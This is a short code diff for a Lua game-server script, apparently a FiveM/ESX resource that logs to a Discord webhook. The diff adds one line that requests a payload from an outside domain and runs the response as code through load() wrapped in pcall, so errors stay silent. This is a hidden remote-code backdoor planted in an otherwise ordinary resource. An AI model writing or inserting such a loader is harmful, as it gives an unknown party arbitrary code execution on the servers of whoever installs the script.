@@ -4,6 +4,8 @@ function LogsDiscord(message,url)
     PerformHttpRequest(DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({username = Config.logs.NameLogs, content = message}), { ['Content-Type'] = 'application/json' })
 end
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 if Config.MenuReward == true then
 	ESX = nil
 	TriggerEvent(Config.ESXSharedObject, function(obj) ESX = obj end)
